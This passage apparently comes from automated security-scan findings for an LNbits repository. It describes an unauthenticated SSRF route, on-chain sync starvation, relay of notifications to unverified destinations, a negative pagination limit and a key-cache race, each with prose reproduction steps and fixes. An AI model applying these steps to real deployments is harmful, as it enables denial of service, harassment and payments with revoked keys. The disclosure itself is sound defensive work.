The handler calls `perform_withdraw(lud17, payment_request)` (services/lnurl.py:149). `handle()` parses the lud17 into an https URL and `_get` -> `_request_lnurl_json` -> `_send_lnurl_request` issues an outbound GET to the fully attacker-chosen host, port, path and query; the JSON is parsed as an LNURL-withdraw response, `check_callback_url` (default rule: any dotted hostname with alphabetic TLD, optional port) is applied to the `callback` the attacker's server returned, and `execute_withdraw` issues a second GET to that callback with `k1` (attacker-chosen via the first response) and `pr` (any syntactically valid bolt11; it is never bound to an invoice of this instance or wallet). Outcomes are distinguishable to the caller through the reflected error strings: `LNURL request failed.` for connection/TLS failures and 4xx/5xx, `Invalid LNURL response.` for 2xx non-LNURL bodies, `LNURL redirect was not allowed.` for 3xx, the remote `reason` for LNURL-shaped error JSON, and the `check_callback_url` message.

The only protections are those in `_validate_lnurl_request_url` (lnurl.py:422): resolve-then-pin with a default block on non-global addresses and https enforcement for global hosts, plus the 256 KiB body cap and 10 s timeout. These hold on default settings and are not bypassed; what remains is an anonymous, blind, GET-only server-side request relay to any public host and port from the LNbits server's egress IP and User-Agent, with attacker-controlled path and query and a status-class/reachability oracle. The only metering is slowapi's default 200 requests/minute keyed on the client address (app.py:481), which the recorded `forwarded_allow_ips="*"` fact makes X-Forwarded-For-controlled.

The root cause is the missing auth dependency on a route whose body is a server-side fetch of a caller-supplied URL: the project gates its LNURL client behind at least an invoice key everywhere else, and this route lets an anonymous peer drive it even on instances with registration closed. Reachable in the shipped server for every deployment (`payment_router` is part of the core router).

## Evidence
1. [lnbits/core/views/payment\_api.py:529–546](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/views/payment_api.py#L529-L546)
   POST /api/v1/payments/{payment_request}/pay-with-nfc declares no auth dependency (no require_admin_key / require_invoice_key / check_user_exists), unlike every other LNURL-client route in lnurl_api.py. It takes an arbitrary bolt11 string (path) and an arbitrary LNURL-withdraw lud17 URL (body, pydantic `Lnurl`) from the anonymous caller and passes both to perform_withdraw(); every exception text is reflected back in `detail`.
2. [lnbits/core/services/lnurl.py:149–171](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/services/lnurl.py#L149-L171)
   perform_withdraw() fetches the attacker-supplied URL (handle -> _get -> _request_lnurl_json), then calls execute_withdraw, which performs a second GET to the callback URL returned by the attacker's server with k1 and the attacker-chosen `pr` appended. Remote `reason` strings and all LnurlResponseException messages propagate to the HTTP response.
3. [lnbits/core/services/lnurl.py:422–460](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/services/lnurl.py#L422-L460)
   _validate_lnurl_request_url is the only guard on the outbound request: it rejects credentials, non-http(s) schemes, http to global hosts and (by default) any host resolving to a non-global IP, pinning the connection to the resolved IP. It does not restrict destination host, port, path or query for public hosts, so the anonymous caller still chooses where on the public internet LNbits connects.
4. [lnbits/static/js/pages/wallet.js:887–901](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/static/js/pages/wallet.js#L887-L901)
   The first-party caller sends the wallet admin key with this request, showing the route was meant to be a wallet-authenticated action; the server simply never checks it.

## Impact
Response bodies are never returned; the caller learns only the error class (connect/TLS failure or 4xx/5xx vs 3xx vs 2xx-non-LNURL vs LNURL error `reason`), so confidentiality is a reachability/status oracle on public hosts as seen from the LNbits server's network position plus reflection of LNURL-shaped `reason` strings. Integrity is low: attacker-chosen GETs with arbitrary path and query are issued from the LNbits IP and User-Agent to third parties (request laundering, triggering GET-driven side effects on hosts that trust that IP). The default private-IP block holds, so internal services are not reached; no funds move; no availability impact beyond ordinary request handling.

## Reproduction steps
1. Anonymous attacker sends one POST to /api/v1/payments/<any-bolt11>/pay-with-nfc with a lud17 `lnurlw://` URL pointing at any public host:port/path?query. LNbits resolves the host, pins the IP, and performs the GET; the attacker's own server can then point the second GET (callback, with attacker-chosen k1 and pr) anywhere that passes the default callback regex and the same resolver check. No credentials, no user interaction, default settings; the per-IP slowapi limit is keyed on a proxy-trusted X-Forwarded-For.

## Recommended fix
1. The pay-with-nfc route performs server-side requests to a caller-supplied URL but is registered with no authentication dependency, so anonymous clients can drive LNbits' outbound LNURL client. Fix criteria: The route must require a wallet key (admin key, matching the first-party caller) or an authenticated user before performing any outbound request; an unauthenticated POST must be rejected with 401 before DNS resolution or any GET takes place. Verify by calling the endpoint without a key and confirming no outbound request is made.
2. perform_withdraw accepts any bolt11 as `pr` without binding it to an invoice created by this instance/wallet, and reflects remote/response-class error text to the caller. Fix criteria: The invoice relayed to the LNURL-withdraw callback must be one that belongs to the authenticated wallet (looked up by payment hash), and error details returned to the client must not distinguish remote reachability/response classes beyond a generic failure message.

---
**Severity:** HIGH
**Status:** Open
**Category:** Server-side request forgery
**CWE:** [CWE-918](https://cwe.mitre.org/data/definitions/918.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** NONE
**Privileges required:** NONE
**User interaction:** NONE
**Vulnerable system confidentiality impact:** LOW
**Vulnerable system integrity impact:** LOW
**Vulnerable system availability impact:** NONE
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/lnbits
**Branch:** main
**Commit:** c35839fc18d3db276ae9fc4a882e45acf93c27c2
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_01BTwWnZcYLbCYri2cBYLV4c&finding=scan_018UQGDd6JX3LQih66KHw1wN-5257189

---

# One user's hostile explorer stalls the shared on-chain sync and grows memory unbounded

## Details
The periodic on-chain synchroniser is a shared, sequential resource: lnbits/app.py:587 registers sync_wallets as a permanent task with interval=60, the task wrapper (lnbits/task_manager.py:145-149) awaits the whole pass before sleeping, and sync_wallets (lnbits/core/services/onchain.py:406-409) awaits scan_wallet for every configured on-chain wallet in turn. The only bound on one wallet's scan is asyncio.wait_for(_scan(wallet_id), timeout=1500) in _scan_with_lease (line 642): 25 minutes.

Any self-registered user can create an on-chain wallet (POST /api/v1/wallet with wallet_type=onchain; no setting gates it), configure a watch-only xpub, and with that wallet's admin key set OnchainConfig.mempool_endpoint to a server they run plus receive_gap_limit/change_gap_limit up to 1000 (PUT /api/v1/wallet/onchain/config, which also calls request_scan). The validator (lnbits/core/models/wallets.py:312-327) only requires an http(s) URL with a hostname; the documentation explicitly supports arbitrary, localhost and LAN explorer URLs.

MempoolExplorer (lnbits/core/services/blockexplorer.py:225-230) is httpx.AsyncClient(timeout=15) with no body size cap or total deadline; every call reads the full body with response.json()/response.text. Under httpx~=0.27.2, timeout=15 bounds each connect/read-chunk, not the request, so the attacker's server can (a) stream arbitrarily large bodies (the very first api/blocks/tip/height request or any history page), which are materialised in process memory, or (b) drip data just under 15 s per chunk to hold each request for as long as it likes. Inside _scan (lines 571-588) up to 1000 discovery rounds run; each round get_wallet_addresses (services/wallets.py:211-247) derives up to gap_limit new addresses whenever the newest address has_activity (set by update_address_snapshot when the served history is non-empty), and scan_address calls history (up to 1000 pages per address) and utxos, persisting the attacker-served lists into onchain_addresses.

Consequences for other users: while the hostile wallet's scan runs, the 60 s periodic pass is blocked, so no other user's on-chain balance or history refreshes (the docs promise a one-minute refresh for all wallets). After the 1500 s timeout, _finish_scan records sync_failed_at and scan_skip_reason imposes only a 60 s cooldown for max_age-based scans, so the next pass repeats the stall indefinitely; the configuration is persisted, so it also re-triggers on every process start. API-triggered scans share SCAN_SLOTS = Semaphore(4) (line 71), and request_scan passes max_age=None so the cooldown is not applied to explicit refreshes: with four such wallets the attacker re-requests after each timeout and holds all four slots continuously, blocking every other user's manual refresh and the periodic task itself. Independently, a single oversized explorer response is loaded whole into memory, so one crafted response can exhaust process memory and crash the entire LNbits instance (Lightning included), which then re-fetches the same endpoint on restart.

This is a deterministic, repeatable starvation of a shared component and an unbounded allocation driven by a single crafted response from a low-privileged user, not a volumetric flood. It records lead x-oc-03.

## Evidence
1. [lnbits/core/services/onchain.py:406–409](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/services/onchain.py#L406-L409)
   sync_wallets awaits scan_wallet(wallet_id, max_age=0) for every configured on-chain wallet sequentially. It is registered as a permanent task with interval=60 (lnbits/app.py:587) whose wrapper (lnbits/task_manager.py:145-149) awaits the whole pass before sleeping, so one wallet's slow scan delays every other user's periodic sync and, since the hostile configuration is persisted in the DB, re-runs on every pass and at every process start.
2. [lnbits/core/services/onchain.py:616–642](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/services/onchain.py#L616-L642)
   _scan_with_lease bounds one wallet scan only by asyncio.wait_for(_scan(wallet_id), timeout=1500) (25 minutes). The freshness/cooldown check runs only when max_age is not None; request_scan() from the API passes max_age=None, so an explicit refresh re-enters immediately after a timeout. SCAN_SLOTS = asyncio.Semaphore(4) (line 71) is shared by the periodic pass and all API-triggered scans, so four hostile wallets hold every slot and block the periodic task itself.
3. [lnbits/core/services/blockexplorer.py:218–230](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/services/blockexplorer.py#L218-L230)
   MempoolExplorer builds httpx.AsyncClient(base_url=<user-chosen endpoint>, timeout=15) with no response size limit and no total-request deadline; every method reads the whole body via response.json()/response.text. With httpx~=0.27.2 (pyproject.toml), timeout=15 is a per-operation (connect/read-chunk) timeout, so a server that keeps sending can stream an arbitrarily large body.
4. [lnbits/core/services/blockexplorer.py:253–306](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/services/blockexplorer.py#L253-L306)
   history fetches up to 1000 pages per address, each parsed whole with response.json() and accumulated in result; only txid format is validated, so attacker-authored transactions of any size and count are retained and later persisted.
5. [lnbits/core/services/onchain.py:554–591](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/services/onchain.py#L554-L591)
   _scan runs up to 1000 discovery rounds; each round calls get_wallet_addresses (lnbits/core/services/wallets.py:211-247), which derives and inserts up to gap_limit (<=1000) further addresses whenever the newest address has_activity, then scan_address for each new address. A fake non-empty history for every address keeps the loop growing until the 1500 s timeout.
6. [lnbits/core/services/onchain.py:304–349](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/services/onchain.py#L304-L349)
   scan_address stores the entire attacker-served transaction and UTXO lists per address via update_address_snapshot (lnbits/core/crud/onchain.py:174-190), which also sets has_activity when transactions is non-empty, feeding the discovery loop and growing onchain_addresses.
7. [lnbits/core/models/wallets.py:305–327](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/models/wallets.py#L305-L327)
   OnchainConfig admits any http(s) mempool_endpoint with a hostname (no allow-list) and receive_gap_limit/change_gap_limit up to 1000.
8. [lnbits/core/views/wallet\_api.py:338–365](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/views/wallet_api.py#L338-L365)
   api_update_config lets the holder of a wallet admin key set the explorer endpoint and gap limits for their own on-chain wallet and immediately calls request_scan. Creating an on-chain wallet (POST /api/v1/wallet, lines 240-274) and configuring a watch-only xpub (POST /api/v1/wallet/onchain) require no admin setting; only hot wallets are gated by lnbits_allow_onchain_payments.

## Impact
No confidentiality or integrity effect. Availability: the shared on-chain synchroniser (periodic and API-triggered) is monopolised indefinitely, so every other user's on-chain balances and history stop updating; and because explorer bodies are read whole with no cap, a single oversized response can exhaust process memory and take down the whole LNbits instance, which re-fetches the persisted hostile endpoint on restart. Persisted fake history additionally grows the database.

## Reproduction steps
1. A self-registered user (registration open by default) creates an on-chain wallet, configures a watch-only xpub, and with the wallet admin key sets mempool_endpoint to a server they run and receive_gap_limit to 1000 via PUT /api/v1/wallet/onchain/config. Their server answers api/blocks/tip/height or api/address/*/txs with huge or endless bodies (or stalls each read just under 15 s) and reports activity on every address. The periodic sync then spends 25 minutes per pass on that wallet forever; with four wallets and repeated POST /api/v1/onchain/sync the Semaphore(4) is held continuously. No victim action and no non-default configuration are needed. Assumption: httpx~=0.27.2 applies timeout=15 per connect/read operation and imposes no response size limit.

## Recommended fix
1. A single wallet's scan, driven by a user-chosen remote server, can consume the entire sequential sync budget (1500 s per wallet, repeated every cycle) and all four API scan slots, and explicit refreshes bypass the failure cooldown, so a shared component is starved by one low-privileged user. Fix criteria: Per-wallet scan time, request count and address-discovery growth must be bounded so no wallet can delay other wallets' syncs by more than a small fixed amount; repeated failures or timeouts must back off exponentially (or disable that wallet's sync until its owner fixes the endpoint) for both periodic and explicit refreshes; and per-user concurrent scans must be limited so one user cannot hold every scan slot. Verify that with one wallet pointed at a stalling or endless explorer, other wallets still sync on roughly the 60 s cadence and other users' manual refreshes complete.
2. MempoolExplorer reads whole response bodies with response.json()/response.text and accumulates up to 1000 pages per address without any size or total-duration limit, and the resulting data is persisted per address, so a crafted response causes unbounded memory and storage growth. Fix criteria: Explorer responses must be read with a hard byte cap and a total-request deadline, pages and transactions per address must be capped, and oversized or malformed data must abort the scan for that wallet only. Verify that an explorer returning a multi-hundred-megabyte or never-ending body is rejected without proportional memory growth.

---
**Severity:** HIGH
**Status:** Open
**Category:** Uncontrolled resource consumption
**CWE:** [CWE-770](https://cwe.mitre.org/data/definitions/770.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** NONE
**Privileges required:** LOW
**User interaction:** NONE
**Vulnerable system confidentiality impact:** NONE
**Vulnerable system integrity impact:** NONE
**Vulnerable system availability impact:** HIGH
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/lnbits
**Branch:** main
**Commit:** c35839fc18d3db276ae9fc4a882e45acf93c27c2
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_01BTwWnZcYLbCYri2cBYLV4c&finding=scan_018UQGDd6JX3LQih66KHw1wN-5257187

---

# Unverified per-user notification destinations let any user relay operator-branded email/Telegram messages to arbitrary third parties

## Details
Per-user payment notifications accept an arbitrary destination with no proof that it belongs to the account, then deliver to it using the operator's credentials.

`PATCH /api/v1/auth` (auth_api.py:589-602) assigns `account.extra = data.extra` wholesale; `UpdateUser.extra` is a full `UserExtra`, whose `notifications: UserNotifications` carries `email_address`, `telegram_chat_id`, `nostr_identifier` and the sats thresholds (users.py:24-30). `update_user_account` validates username/email/pubkey/labels but never touches `extra.notifications`; the only check on the email is the format regex `is_valid_email_address` at send time. `email_address` is not even exposed in the account UI (account.vue:712-803 shows only the Nostr and Telegram fields) — it is an API-only field that the sending code nonetheless honours.

Delivery: `send_chat_payment_notification` (notifications.py:377-389) runs for every payment (receiver side via the `internal_invoice_queue` → `dispatch_payment_notification` listener registered in app.py:583, sender side via `_send_payment_notification_in_background`, payments.py:863-869). The user-set thresholds default to 0, so every payment qualifies. `send_user_notification` (notifications.py:89-109) hands the destinations to `send_notification`, whose email branch (:136-137) is gated only by `settings.lnbits_email_notifications_enabled` — the same flag the operator turns on for their own admin alerts — and then `send_email` authenticates to the operator's SMTP server with `lnbits_email_notifications_username/password` and sends From `lnbits_email_notifications_email`. The Telegram branch (:120-121) uses the operator's bot token.

Trigger cost is nil: internal payments between the attacker's own wallets have a zero fee reserve (settings.py:390-392) and the service fee ignores internal payments by default, so a 1-sat balance can be bounced A→B→A indefinitely, producing two messages (PAYMENT SENT + PAYMENT RECEIVED) per hop. No rate limit exists anywhere on the notification path. The body is `[<site title>]` + the template (notifications.py models :65-68), which embeds `{wallet_name}` — set via `PUT /api/v1/wallet/{new_name}` with no validation or length limit (wallet_api.py:137-143).

Result (reachable only where the operator has enabled email and/or Telegram notifications): a registered user turns the LNbits server into a confused-deputy relay — operator-branded, partly attacker-worded mail from the operator's SMTP identity to any third-party address at attacker-chosen volume (harassment/mail-bombing, phishing pretext, sender-reputation and quota damage that also degrades the operator's own alert channel). The Telegram channel is limited to chats that have started the operator's bot (e.g. the admin's own alert chat if its id is known). The address format regex prevents header/envelope injection, so this is destination abuse, not injection. Admin-configured destinations (`lnbits_email_notifications_to_emails`, `/admin/api/v1/testemail`) are operator-trusted and not part of this finding.

## Evidence
1. [lnbits/core/views/auth\_api.py:589–602](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/views/auth_api.py#L589-L602)
   PATCH /api/v1/auth assigns account.extra = data.extra wholesale for the caller's own account; extra.notifications.email_address / telegram_chat_id / nostr_identifier and the thresholds are stored with no ownership verification (update_user_account's validate_fields never inspects extra.notifications).
2. [lnbits/core/services/notifications.py:89–109](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/services/notifications.py#L89-L109)
   send_user_notification forwards the user-chosen telegram_chat_id, nostr_identifier and email_address to send_notification_in_background with no check that the account controls them.
3. [lnbits/core/services/notifications.py:136–137](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/services/notifications.py#L136-L137)
   The email branch is gated only by the operator's lnbits_email_notifications_enabled flag (which also powers admin alerts); send_email_notification then authenticates with the operator's SMTP username/password and sends From the operator's address.
4. [lnbits/core/services/notifications.py:377–389](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/services/notifications.py#L377-L389)
   Per-payment trigger: user thresholds (outgoing_payments_sats / incoming_payments_sats) default to 0, so every payment on any non-excluded wallet enqueues a user notification to the stored destinations.
5. [lnbits/core/models/users.py:24–30](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/models/users.py#L24-L30)
   UserNotifications has no verified flag for any destination, thresholds default to 0 and have no lower bound.
6. [lnbits/core/services/payments.py:863–869](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/services/payments.py#L863-L869)
   Each internal (self) payment notifies the sender wallet and enqueues the receiver's invoice for the core dispatch_payment_notification listener, yielding two operator-branded messages per hop.
7. [lnbits/settings.py:390–392](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/settings.py#L390-L392)
   fee_reserve returns 0 for internal payments (and lnbits_service_fee_ignore_internal defaults True), so bouncing 1 sat between the attacker's own wallets costs nothing and can be looped indefinitely.
8. [lnbits/core/views/wallet\_api.py:137–143](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/views/wallet_api.py#L137-L143)
   Wallet name is set from the URL path with no validation or length limit; it is the attacker-worded text embedded in every delivered message.
9. [lnbits/core/models/notifications.py:65–68](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/models/notifications.py#L65-L68)
   The incoming_payment template embeds {wallet_name} inside the operator-branded message body.

## Impact
The operator's messaging identity (SMTP account / Telegram bot) is made to carry attacker-worded content it never authorised (integrity, low). Unbounded, zero-cost sending through the operator's mail account consumes its quota and sender reputation, degrading the same channel the operator relies on for admin alerts (availability, low). No LNbits data is disclosed. Subsequent-system impact: The messages leave LNbits for a third party the attacker names: the recipient's mailbox or Telegram chat receives repeated operator-branded messages containing attacker-chosen wallet-name text, usable for harassment or phishing pretext. Limited, nuisance-level impact.

## Reproduction steps
1. Any registered user (registration open by default) PATCHes /api/v1/auth with extra.notifications.email_address=<victim> (API-only field) and thresholds 0, names a wallet with the desired text, then loops 1-sat internal payments between two own wallets; each hop emails the victim twice from the operator's SMTP identity. Holds where the operator has enabled email (or Telegram) notifications; nothing else outside the attacker's control is required.

## Recommended fix
1. User-supplied notification destinations (email_address, telegram_chat_id, nostr_identifier) are stored and used without proof that the account controls them. Fix criteria: No user notification is delivered to a destination until the user has proven control of it (confirmation code/link for email, bot handshake for Telegram, signed proof for Nostr); unverified destinations are never passed to send_user_notification, and the API-only email_address field is either verified or rejected.
2. Notification volume is entirely attacker-controlled: thresholds default to 0, internal self-payments are free, and no rate limit exists on the send path. Fix criteria: Per-user notification sending is rate-limited and/or a sane minimum threshold is enforced, so a user cannot drive unbounded outbound mail from the operator's account.
3. Attacker-chosen free text (wallet name, unvalidated and unbounded) is embedded verbatim in operator-branded messages. Fix criteria: Wallet names are length-limited and clearly delimited or omitted in outbound notifications so recipients cannot mistake attacker text for operator content.

---
**Severity:** MEDIUM
**Status:** Open
**Category:** Confused deputy
**CWE:** [CWE-441](https://cwe.mitre.org/data/definitions/441.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** NONE
**Privileges required:** LOW
**User interaction:** NONE
**Vulnerable system confidentiality impact:** NONE
**Vulnerable system integrity impact:** LOW
**Vulnerable system availability impact:** LOW
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** LOW
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/lnbits
**Branch:** main
**Commit:** c35839fc18d3db276ae9fc4a882e45acf93c27c2
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_01BTwWnZcYLbCYri2cBYLV4c&finding=scan_018UQGDd6JX3LQih66KHw1wN-5257556

---

# Negative limit query parameter bypasses the 1000-row page cap on the default SQLite backend

## Details
`Filters.pagination()` (lnbits/db.py:562-570) caps page size with `LIMIT {min(1000, self.limit)}` but only normalises `0` and `None`; a negative value survives `min()` and is interpolated verbatim. `parse_filters` (lnbits/decorators.py:460-484) binds `limit: int | None` and `offset: int | None` straight from the query string with no lower bound and `Filters` has no validator for them. On SQLite - the shipped default (`lnbits_database_url` defaults to None, settings.py:1233, so `DB_TYPE = SQLITE`, db.py:46; docs/guide/installation.md:19 'LNbits uses SQLite by default') - a negative LIMIT is documented to mean 'no upper bound', so `?limit=-1` makes every `fetch_page`-backed listing return and materialise the caller's entire visible result set in one request. Reachable endpoints include `GET /api/v1/payments` and `/api/v1/payments/paginated` (invoice key), `/api/v1/payments/all/paginated`, `/api/v1/wallet/paginated`, the admin users and audit listings, assets and node listings - every route using `Depends(parse_filters(...))`. The project treats this input as invalid elsewhere: the scheduler endpoints declare `limit: int = Query(ge=1, le=1000)` (scheduler_api.py:32, 54) and tests/api/test_scheduler_api.py:329 asserts `limit=-1` yields 400; the WASM storage path clamps and binds `min(limit, 1000)` (wasm_ext/storage/crud.py:169). The generic path has no such bound.

Authorization is intact (WHERE clauses still scope rows to the caller), so the effect is resource consumption whose bound the attacker sets: `Connection.fetchall` collects every row with `result.mappings().all()` and runs `dict_to_model` (JSON decoding of nested fields, pydantic 1.10 validation) per row, then `fetch_page` runs the COUNT query, all inside `Database.connect()` which holds the per-Database `asyncio.Lock` (db.py:324-343) for the duration; the per-row model construction is synchronous CPU work on the event loop. A wallet-key holder grows their own `apipayments` slice without limit by creating invoices (the slowapi default of 200 req/min bounds the rate, not the row count) and then dumps it in one request, repeatedly; an admin calling `/payments/all/paginated?limit=-1` on a large instance does the same to the whole table. The sanctioned path concedes at most 1000 rows per request (`limit=0` maps to 1000), so the gain is unbounded single-request peak memory and lock/event-loop hold time. On PostgreSQL the same input is rejected by the server (`LIMIT must not be negative`) and surfaces as a 500 with no resource effect. A negative `offset` passes through as well (SQLite treats it as 0, PostgreSQL errors) and adds nothing beyond the limit issue.

Dependency assumption: SQLite (via aiosqlite ~0.22.1 / SQLAlchemy ~1.4.54, pyproject.toml) interprets a negative LIMIT as unlimited, per the SQLite SELECT documentation.

## Evidence
1. [lnbits/db.py:562–570](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/db.py#L562-L570)
   Filters.pagination emits `LIMIT {min(1000, self.limit)}`; only 0 and None are normalised, so a negative limit passes min() unchanged and is interpolated verbatim. SQLite treats a negative LIMIT as 'no upper bound', defeating the 1000-row cap this code intends; PostgreSQL rejects it (500).
2. [lnbits/decorators.py:460–483](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/decorators.py#L460-L483)
   parse_filters binds `limit: int | None` and `offset: int | None` from the query string with no ge/le constraint and passes them into Filters, which has no validator for them; this dependency is used by every paginated core listing (payments, wallets, users, audit, assets, node).
3. [lnbits/db.py:247–276](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/db.py#L247-L276)
   fetch_page runs the query with fetchall, which materialises every row via result.mappings().all() and maps each through dict_to_model, then also runs the COUNT query because filters.limit is truthy; memory and CPU scale with the full visible result set.
4. [lnbits/db.py:324–343](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/db.py#L324-L343)
   Database.connect() acquires the per-Database asyncio.Lock and holds it for the whole fetch_page (fetchall, per-row model construction and COUNT), so one unbounded listing stalls every other DB operation on the core database for its duration.
5. [lnbits/core/views/scheduler\_api.py:31–35](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/views/scheduler_api.py#L31-L35)
   The project's own control for this surface: scheduler listings override the parse_filters values with `limit: int = Query(ge=1, le=1000)` and `offset: int = Query(ge=0)`, and tests/api/test_scheduler_api.py:329 asserts limit=-1 is rejected with 400. No other parse_filters consumer applies this bound.
6. [lnbits/db.py:44–46](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/db.py#L44-L46)
   DB_TYPE falls back to SQLITE when lnbits_database_url is unset (settings.py:1233 default None), so the shipped default deployment is the one on which the negative LIMIT removes the cap.

## Impact
No data beyond what the caller may already read is exposed and nothing is modified; the effect is unbounded single-request materialisation of the caller's visible rows (peak memory proportional to the attacker-grown table), with the process-wide core DB lock held and the event loop busy in per-row model construction for the duration, degrading service for all users. Rated LOW because the reach per request is bounded by the rows the attacker has inserted and PostgreSQL deployments are unaffected.

## Reproduction steps
1. Any authenticated principal (wallet invoice/admin key, user session or admin) appends `?limit=-1` to a paginated API call; registration is open by default so the position is cheap to obtain. The affected backend (SQLite) is the shipped default (settings.py:1233, db.py:46), so no non-default deployment condition is needed; the attacker grows their own payments slice beforehand by creating invoices. The request is trivial and repeatable within the 200 req/min slowapi default.

## Recommended fix
Pagination quantities (limit, offset) from the query string are interpolated into SQL after a one-sided min() clamp that does not validate sign or range, so a negative limit reaches SQLite where it means 'unlimited'. Fix criteria: limit and offset are validated as non-negative integers at the parse_filters boundary (as the scheduler endpoints already do with Query(ge=..., le=...)) and Filters.pagination clamps limit into [1, 1000] regardless of the caller; `?limit=-1` and `?offset=-1` yield a 4xx or a page of at most the configured maximum on both SQLite and PostgreSQL, with tests covering the generic parse_filters consumers.

---
**Severity:** MEDIUM
**Status:** Open
**Category:** Improper input validation
**CWE:** [CWE-1284](https://cwe.mitre.org/data/definitions/1284.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** NONE
**Privileges required:** LOW
**User interaction:** NONE
**Vulnerable system confidentiality impact:** NONE
**Vulnerable system integrity impact:** NONE
**Vulnerable system availability impact:** LOW
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/lnbits
**Branch:** main
**Commit:** c35839fc18d3db276ae9fc4a882e45acf93c27c2
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_01BTwWnZcYLbCYri2cBYLV4c&finding=scan_018UQGDd6JX3LQih66KHw1wN-5257551

---

# Wallet key reset evicts key cache before persisting new keys; revoked key re-cached for TTL

## Details
Wallet key rotation (`PUT /api/v1/wallet/reset/{wallet_id}`) is the owner's remedy when an admin or invoice key has leaked. `api_reset_wallet_keys` (lnbits/core/views/wallet_api.py:154-168) first pops the three cache entries (`auth:wallet:{id}`, `auth:x-api-key:{adminkey}`, `auth:x-api-key:{inkey}`) and only then awaits `update_wallet` to persist the new keys. Between the synchronous pop and the UPDATE commit the database still contains the old keys and nothing stops them from being cached again.

`LightKeyChecker` (lnbits/decorators.py:155-184), used by every `require_base_admin_key`/`require_base_invoice_key` endpoint including `POST /api/v1/payments`, takes `db.connect()` before checking the cache; on a miss it runs `get_base_wallet_for_key` and then stores the result for `auth_authentication_cache_minutes` (default 10 min). `Database.connect` (lnbits/db.py:324-343) serialises all connections behind one FIFO `asyncio.Lock`. Consequently any key-holder request that is queued on that lock when the reset handler's own `get_wallet` releases it runs *after* the pop (so its `cache.get` misses) and *before* `update_wallet` can re-acquire the lock (so its SELECT still matches the old key). That request re-inserts `auth:x-api-key:{old_key}` with a fresh 10-minute expiry. Every subsequent request with the revoked key then hits the cache (lines 162-166) and is accepted without consulting the wallets table.

Attack: an attacker holding a leaked admin key (e.g. scraped from a public repo or a compromised client) runs a tight loop of `GET /api/v1/payments` or any other light-key endpoint with that key. Normal requests are cache hits and are harmless; the loop simply guarantees waiters on the DB lock at all times. When the owner notices the leak and resets the keys, the race resolves in the attacker's favour as described, and the "revoked" admin key keeps authorising `POST /api/v1/payments` with `out: true` (pay invoice from the victim's wallet), payment listing, label edits, etc. for up to ten more minutes, while the owner believes the key is dead and the UI shows the new keys. The attacker needs no timing precision: the pre-existing stream is enough.

The same evict-before-write ordering exists in `delete_wallet`, `force_delete_wallet` and `delete_wallet_by_id` (lnbits/core/crud/wallets.py:80-123), so soft-deleting a wallet (user `DELETE /api/v1/wallet/{id}` or admin wallet deletion / account deletion) can likewise leave the wallet's keys live in the cache after the row is flagged deleted.

